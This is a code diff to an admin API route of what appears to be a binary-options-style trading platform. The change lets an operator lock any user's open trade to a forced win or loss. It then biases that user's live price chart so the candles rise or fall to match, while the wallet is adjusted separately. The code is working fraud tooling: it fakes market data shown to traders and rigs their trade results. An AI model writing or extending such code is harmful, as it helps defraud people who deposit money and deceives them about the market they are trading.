@@ -1032,7 +1032,7 @@ router.put(
     }
 
     const trade = await SecondsTrade.findById(req.params.id);
-    if (!trade || trade.status !== "open") {
+    if (!trade || (trade.status !== "open" && trade.status !== "settling")) {
       return res.status(404).json({
         success: false,
         error: "NotFoundError",
@@ -1040,35 +1040,56 @@ router.put(
       });
     }
 
-    const step = Number(req.body.step) || 2;
+    // Graph HIGH / LOW — lock WIN or LOSS (no manual balance amount).
+    // Candles drift via chart bias; trade settles on timer with forced outcome.
+    // Admin adjusts wallet separately via Update Wallet.
+    const goingUp = req.body.direction === "up";
+    const goingDown = req.body.direction === "down";
+
     if (req.body.direction === "reset") {
       trade.priceBiasPercent = 0;
-    } else if (req.body.direction === "up") {
-      trade.priceBiasPercent = Number(trade.priceBiasPercent || 0) + step;
-    } else {
-      trade.priceBiasPercent = Number(trade.priceBiasPercent || 0) - step;
+      trade.forcedOutcome = null;
+      trade.forcedAmount = null;
+    } else if (goingUp) {
+      trade.forcedOutcome = "win";
+      trade.forcedAmount = null;
+      trade.priceBiasPercent = 5;
+    } else if (goingDown) {
+      trade.forcedOutcome = "loss";
+      trade.forcedAmount = null;
+      trade.priceBiasPercent = -5;
     }
+    if (trade.status === "settling") trade.status = "open";
     await trade.save();
 
-    // Mirror onto user chartBias so whole chart moves for this asset
+    // Mirror onto user chartBias so the live chart drifts for this asset.
     const user = await User.findById(trade.user);
     if (user) {
       if (!user.chartBias) user.chartBias = new Map();
       const cur = Number(user.chartBias.get(trade.asset) || 0);
-      const step = Number(req.body.step) || 2;
       if (req.body.direction === "reset") {
         user.chartBias.set(trade.asset, 0);
-      } else if (req.body.direction === "up") {
-        user.chartBias.set(trade.asset, cur + step);
-      } else {
-        user.chartBias.set(trade.asset, cur - step);
+      } else if (goingUp) {
+        const target = 5;
+        const next = cur < target ? Math.min(target, cur + 1.2) : target;
+        user.chartBias.set(trade.asset, next);
+      } else if (goingDown) {
+        const target = -5;
+        const next = cur > target ? Math.max(target, cur - 1.2) : target;
+        user.chartBias.set(trade.asset, next);
       }
       await user.save();
     }
 
+    const label = goingUp
+      ? "Graph HIGH · WIN locked · candles rising"
+      : goingDown
+        ? "Graph LOW · LOSS locked · candles falling"
+        : "Graph bias reset.";
+
     res.json({
       success: true,
-      message: `Graph nudged ${req.body.direction}.`,
+      message: label,
       trade: serializeAdminTrade(trade, user),
       chartBias: user?.chartBias
         ? Object.fromEntries(user.chartBias)
